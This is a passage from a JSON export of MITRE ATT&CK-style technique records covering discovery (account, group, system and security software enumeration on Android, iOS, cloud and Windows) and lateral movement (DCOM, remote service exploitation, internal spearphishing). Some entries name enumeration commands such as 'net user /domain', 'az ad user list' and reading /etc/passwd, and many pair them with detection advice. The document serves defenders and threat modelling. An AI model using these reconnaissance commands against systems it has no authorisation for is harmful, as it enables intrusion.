Discovery","sort_id":0,"external_id":"T1424","external_sub_id":null,"old_external_id":"MOB-T1027","old_external_sub_id":null,"tactic_id":20,"description":"<p>On Android versions prior to 5, applications can observe information about other processes that are running through methods in the ActivityManager class. On Android versions prior to 7, applications can obtain this information by executing the <code>ps<\/code> command, or by examining the <code>\/proc<\/code> directory. Starting in Android version 7, use of the Linux kernel's <code>hidepid<\/code> feature prevents applications (without escalated privileges) from accessing this information (Citation: Android-SELinuxChanges).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":478,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":489,"name":"T1426 - System Information Discovery","sort_id":0,"external_id":"T1426","external_sub_id":null,"old_external_id":"MOB-T1029","old_external_sub_id":null,"tactic_id":20,"description":"<p>An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, and architecture.<\/p>\n<p>On Android, much of this information is programmatically accessible to applications through the android.os.Build class.(Citation: Android-Build)<\/p>\n<p>On iOS, techniques exist for applications to programmatically access this information.(Citation: StackOverflow-iOSVersion)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":489,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":489,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":490,"name":"T1422 - System Network Configuration Discovery","sort_id":0,"external_id":"T1422","external_sub_id":null,"old_external_id":"MOB-T1025","old_external_sub_id":null,"tactic_id":20,"description":"<p>On Android, details of onboard network interfaces are accessible to apps through the <code>java.net.NetworkInterface<\/code> class.(Citation: NetworkInterface) The Android <code>TelephonyManager<\/code> class can be used to gather related information such as the IMSI, IMEI, and phone number.(Citation: TelephonyManager)<\/p>\n<p>On iOS, gathering network configuration information is not possible without root access.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":490,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":490,"platform_id":11,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}}]},{"id":491,"name":"T1421 - System Network Connections Discovery","sort_id":0,"external_id":"T1421","external_sub_id":null,"old_external_id":"MOB-T1024","old_external_sub_id":null,"tactic_id":20,"description":"<p>On Android, applications can use standard APIs to gather a list of network connections to and from the device. For example, the Network Connections app available in the Google Play Store (Citation: ConnMonitor) advertises this functionality.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":491,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":532,"name":"T1087.004 - Cloud Account","sort_id":0,"external_id":"T1087.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider of SaaS application.<\/p>\n<p>With authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember<\/code> PowerShell cmdlet can be used to obtain account names given a role or permissions group.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance)<\/p>\n<p>Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list<\/code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information.","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":532,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":532,"platform_id":5,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":532,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":532,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":532,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":532,"platform_id":9,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":534,"name":"T1069.003 - Cloud Groups","sort_id":0,"external_id":"T1069.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.<\/p>\n<p>With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole<\/code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.(Citation: Microsoft Msolrole)(Citation: GitHub Raindance)<\/p>\n<p>Azure CLI (AZ CLI) also provides an interface to obtain permissions groups with authenticated access to a domain. The command <code>az ad user get-member-groups<\/code> will list groups associated to a user account.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity.","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":534,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":534,"platform_id":5,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":578,"name":"T1087.002 - Domain Account","sort_id":0,"external_id":"T1087.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.<\/p>\n<p>Commands such as <code>net user \/domain<\/code> and <code>net group \/domain<\/code> of the <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a> utility, <code>dscacheutil -q group<\/code>on macOS, and <code>ldapsearch<\/code> on Linux can list domain users and groups.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).\n","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":578,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":578,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":578,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":583,"name":"T1069.002 - Domain Groups","sort_id":0,"external_id":"T1069.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.<\/p>\n<p>Commands such as <code>net group \/domain<\/code> of the <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a> utility,  <code>dscacheutil -q group<\/code> on macOS, and <code>ldapsearch<\/code> on Linux can list domain-level groups.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":583,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":583,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":583,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":589,"name":"T1087.003 - Email Account","sort_id":0,"external_id":"T1087.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)<\/p>\n<p>In on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList<\/code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":589,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":589,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":651,"name":"T1087.001 - Local Account","sort_id":0,"external_id":"T1087.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.<\/p>\n<p>Commands such as <code>net user<\/code> and <code>net localgroup<\/code> of the <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a> utility and <code>id<\/code> and <code>groups<\/code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>\/etc\/passwd<\/code> file.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":651,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":651,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":651,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":655,"name":"T1069.001 - Local Groups","sort_id":0,"external_id":"T1069.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.<\/p>\n<p>Commands such as <code>net localgroup<\/code> of the <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a> utility, <code>dscl . -list \/Groups<\/code> on macOS, and <code>groups<\/code> on Linux can list local groups.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":655,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":655,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":655,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":742,"name":"T1518.001 - Security Software Discovery","sort_id":0,"external_id":"T1518.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1518\/001\">Security Software Discovery<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>\n<p>Example commands that can be used to obtain security software information are <a href=\"https:\/\/attack.mitre.org\/software\/S0108\">netsh<\/a>, <code>reg query<\/code> with <a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a>, <code>dir<\/code> with <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a>, and <a href=\"https:\/\/attack.mitre.org\/software\/S0057\">Tasklist<\/a>, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.<\/p>\n<p>Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).\n\nIn cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":742,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":742,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":742,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":742,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":742,"platform_id":5,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":742,"platform_id":6,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":742,"platform_id":7,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":742,"platform_id":8,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":742,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]}]},{"id":25,"name":"Lateral Movement","source_name":"ENTERPRISE_lateral-movement","sort_id":0,"external_id":"TA0008","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":17,"tactic_id":25},"techniques":[{"id":161,"name":"T1017 - Application Deployment Software","sort_id":0,"external_id":"T1017","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.<\/p>\n<p>Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":161,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":161,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":161,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":191,"name":"T1175 - Component Object Model and Distributed COM","sort_id":0,"external_id":"T1175","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. <\/p>\n<p>COM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)<\/p>\n<p>Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.<\/p>\n<p>Adversaries may abuse COM for local command and\/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\">Scheduled Task<\/a>, fileless download\/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)<\/p>\n<p>Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke <a href=\"https:\/\/attack.mitre.org\/techniques\/T1173\">Dynamic Data Exchange<\/a> (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":191,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":244,"name":"T1210 - Exploitation of Remote Services","sort_id":0,"external_id":"T1210","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.<\/p>\n<p>An adversary may need to determine if the remote system is in a vulnerable state, which may be done through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1046\">Network Service Scanning<\/a> or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.<\/p>\n<p>There are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)<\/p>\n<p>Depending on the permissions level of the vulnerable remote service an adversary may achieve <a href=\"https:\/\/attack.mitre.org\/techniques\/T1068\">Exploitation for Privilege Escalation<\/a> as a result of lateral movement exploitation as well.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https:\/\/attack.mitre.org\/techniques\/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":244,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":244,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":244,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":276,"name":"T1534 - Internal Spearphishing","sort_id":0,"external_id":"T1534","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood 